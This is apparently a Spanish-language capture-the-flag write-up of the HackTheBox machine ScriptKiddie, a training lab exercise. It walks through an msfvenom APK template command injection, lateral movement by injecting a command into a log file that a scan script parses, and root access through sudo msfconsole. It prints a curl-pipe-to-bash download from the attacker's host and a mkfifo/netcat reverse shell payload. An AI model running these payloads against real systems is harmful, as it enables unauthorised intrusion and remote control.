---
layout      : post
title       : "ScriptKiddie - HackTheBox"
author      : elc4br4
image       : assets/images/HTB/ScriptKiddie-HackTheBox/Scriptkiddie.webp
category    : [ htb ]
tags        : [ Linux ]
---

Tenemos una máquina nivel EASY Linux bastante sencilla, tendremos que ganar acceso a través de un exploit que generá una apk maliciosa que podremos introducir y ejecutar en el servidor web, tendremos que realizar una escalada lateral aprovechándonos de un fallo en un srcipt a través del cual podremos inyectar comandos y finalizaremos con una escalada vertical al usuario root a través de la utilidad msfconsole.

![](/assets/images/HTB/ScriptKiddie-HackTheBox/Scriptkiddie2.webp)

[![HTBadge](https://www.hackthebox.eu/badge/image/533771)](https://www.hackthebox.com/home/users/profile/533771)

![](/assets/images/HTB/ScriptKiddie-HackTheBox/Scriptkiddie-rating.webp)

***


**Un pequeño INDICE**

1. [Reconocimiento](#reconocimiento).
    * [Reconocimiento de Puertos](#recon-nmap).
2. [Enumeración](#enumeración).
    * [Enumeración Web](#enum-web).
3. [Explotación](#explotacion).
    * [Metasploit](#metasploit).
4. [Escalada de Privilegios](#privesc). 
    * [Movimiento Lateral - Usuario pwn](#pwn).
    * [Escalada Vertical - Usuario root](#root).


***

# Reconocimiento [#](reconocimiento) {#reconocimiento}

***

## Reconocimiento de Puertos [🔍](#recon-nmap) {#recon-nmap}

Como siempre comenzamos lanzando nmap para encontrar los puertos abiertos en la máquina.

```nmap 
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```

Realizo un escaneo más avanzado para obtener más información acerca de los servicios que corren en los puertos abiertos.

```nmap
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 5000   | http     | Werkzeug httpd 0.16.1 |
| 22     | ssh      | OpenSSH 8.2p1 |

> Servidor web en el puerto 5000 (Werkzeug httpd 0.16.1) 


# Enumeración [#](enumeración) {#enumeración}

***

## Enumeración Web [🔢](#enum-web) {#enum-web}

Al acceder al servidor web encontramos lo siguiente

![](/assets/images/HTB/ScriptKiddie-HackTheBox/web1.png)

![](/assets/images/HTB/ScriptKiddie-HackTheBox/web2.png)

Parece que tenemos las herramientas nmap, msfvenom y searchsploit.

Voy probando a cada herramienta, el nmap funciona si pongo una ip, es decir me escanea los puertos... mmm

En la herramienta msfvenom me genera un archivo malicioso y me lo descarga

![](/assets/images/HTB/ScriptKiddie-HackTheBox/msfvenom.png)

Pero me deja subir un template, algo bastante curioso.

En la herramienta searchsploit más de lo mismo, funciona correctamente pero no veo nada que pueda hacer para avanzar.

Asique voy a aprovechar que tenemos searchsploit para buscar vulnerabilidades del servidor web, que sabemos que es <span style="color:red">Werkzeug httpd 0.16.1</span>

Con searchsploit busco alguna vulnerabilidad pero nada.

Asique solo se me ocurre buscar alguna vulnerabilidad de las herramientas que tenemos en el servidor, descartando searchsploit pruebo con msfvenom.

Y ojo porque tenemos una vulnerabilidad.

![](/assets/images/HTB/ScriptKiddie-HackTheBox/searchsploit.png)

> <span style="color:red">Metasploit Framework 6.0.11 - msfvenom APK template command injection</span>

Justo lo que necesitamos!!!

# Explotación [#](explotacion) {#explotacion}

***

## Metasploit [👿](#metasploit) {#metasploit}

Me descargo el exploit y lo abro para analizar el código

Si nos fijamos en la línea de la carga util (payload) nos dice 'Change me' de forma que podemos insertar el comando que queramos, ya que la vulnerabilidad es Command Injection.

Procedo a crear un archivo con una reverse shell en bash.

![](/assets/images/HTB/ScriptKiddie-HackTheBox/reverse_bash.png)

> Una vez creado lanzo un servidor de python <span style="color:red">python3 -m http.server 8080</span>

> Edito el campo payload del exploit añadiendo lo siguiente

<span style="color:red">curl http://10.10.14.7:8080/rev.sh | bash</span>

A continuación lanzamos el exploit para que nos genere un archivo malicioso apk con el payload indicado.

![](/assets/images/HTB/ScriptKiddie-HackTheBox/exploit_apk.png)

Una vez generado debemos subir el archivo apk a la web desde el apartado template y se hará la magia.

![](/assets/images/HTB/ScriptKiddie-HackTheBox/shell.png)

Una vez dentro actualizamos la tty para tener una shell completa en tamaño y funciones.

```bash
# Actualización TTY

kid@scriptkiddie:~/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null

---------------------------------------------------

kid@scriptkiddie:~/html$ ^Z
zsh: suspended  sudo nc -lnvp 443

---------------------------------------------------

❯ stty raw -echo; fg
[1]  + continued  sudo nc -lnvp 443
                                   reset
reset: unknown terminal type unknown
Terminal type? xterm

---------------------------------------------------

# Exportamos las Variables de Entorno

kid@scriptkiddie:~/html$ export TERM=xterm
kid@scriptkiddie:~/html$ export SHELL=bash

```

Ahora ya podemos leer la flag user.

Continuo enumerando ya que estoy autenticado como el usuario kid pero también tenemos al usuario pwn.

Por lo tanto debemos migranos a este usuario.


# Escalada de Privilegios [#](privesc) {#privesc}

***

## Movimiento Lateral - Usuario pwn [😎](#pwn) {#pwn}

Enumerando un poco encuentro en la carpeta del usuario pwn un script llamado `scanlosers.sh`

Si miramos el contenido del script.

![](/assets/images/HTB/ScriptKiddie-HackTheBox/scanlosers.webp)

Para poder entender que hace el script debemos irnos antes al archivo app.py

![](/assets/images/HTB/ScriptKiddie-HackTheBox/app.webp)

```bash 
#En ese fragmento del archivo `app.py` podemos ver que se guarda un TimeStamp y una dirección IP.
-------------------------------------------------------------------------------------------------
[{datetime.datetime.now()}] {scrip}
```

Por lo tanto el script del usuario pwn (`scanlosers.sh`) lo que hace es leer el archivo `/home/kid/logs/hackers` y lo guarda en la variable `$log` pero rápidamente borra el contenido, ya que en el script `scanlosers.sh` la última línea es `echo -n > $log`

De forma que leyendo un poco el script sabemos que la data se almacena en el archivo de la siguiente forma:

```bash
[FECHA Y HORA] IP
```

El script saca el contenido del archivo cogiendo la IP y realizando un escaneo nmap de los 10 top ports.

Para probar y entenderlo genero un simple ejemplo creando mi propio archivo hackers.

```bash
# Archivo Hackers
Hola esto es una Prueba
````

En el script se ejecuta un  `cut -d' ' -f3-` | sort -u 

Asique voy a ir desglosando el comando para lograr entenderlo, probando con mi archivo hackers.

Cut lo que hace es cortar el archivo en partes.

| Parámetro | Descripción| 
| :-------- | :------- | 
| -d ' '    | Delimitador que en este caso es el espacio ' '|        
| -f3       | Selecciona solamente el campo asigando, en este caso 3|   

De forma que si lo probamos...

```bash
> cat hackers | cut -d' ' -f3
es

#Nos está sacando el campo número 3 de la frase: Hola esto ES una prueba
```
Pero en el script tenemos `cut -d' ' -f3-` es decir hay un guión detrás del 3.
Si probamos con nuestro ejemplo...

```bash
> cat hackers | cut -d' ' -f3-
es una prueba

# Al añadir el guión detras del campo 3 nos saca del campo 3 en adelante
```

Por lo tanto ahí podríamos aprovechar e intentar inyectar comandos de la siguiente forma.

Tengamos en cuenta que además de eso el archivo hackers cuando le metemos data rápidamente se elimina por el `echo -n > $log`

Asique voy a crear un pequeño script en bash para que cada vez que lo ejecute se meta la data que yo tengo en mi script en el archivo hackers.

```bash
# Script para la Inyección de Comandos, intentaremos obtener una rev shell 
--------------------------------------------------------------------------
#!/bin/bash

while true; do
    echo "1 2 ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 4444 >/tmp/f #" > /home/kid/logs/hackers 
done
```
El script cogerá del 3 en adelante.

Abrimos un oyente de netcat en elpuerto 4444, asiganmos permisos y lo ejecutamos.

![](/assets/images/HTB/ScriptKiddie-HackTheBox/lateral.webp)

Y tenemos conexión en el netcat como el usuario 

![](/assets/images/HTB/ScriptKiddie-HackTheBox/nc.webp)

Y ya nos hemos convertido en el usuario pwn.

Para tener la shell un poco más funcional lanzo el comando:

<span style="color:red">python3 -c ´import pty;pty.spawn("/bin/bash")´</span>

A continuación toca escalar privilegios al usuario root.


## Escalada Vertical - Usuario root [😎](#root) {#root}

Para proceder a escalar privilegios, como siempre enumeramos posibles vectores de escalada.

Como de costumbre comienzo lanzando `sudo -l`

Al lanzar `sudo -l` puedo ver que puedo ejecutar como root sin contraseña msfconsole.

![](/assets/images/HTB/ScriptKiddie-HackTheBox/sudol.webp)

Ejecuto la utilidad msfconsole como root

![](/assets/images/HTB/ScriptKiddie-HackTheBox/root1.webp)

Somos root y podemos leer la flag root

![](/assets/images/HTB/ScriptKiddie-HackTheBox/root.webp)

![](/assets/images/HTB/ScriptKiddie-HackTheBox/share.webp)










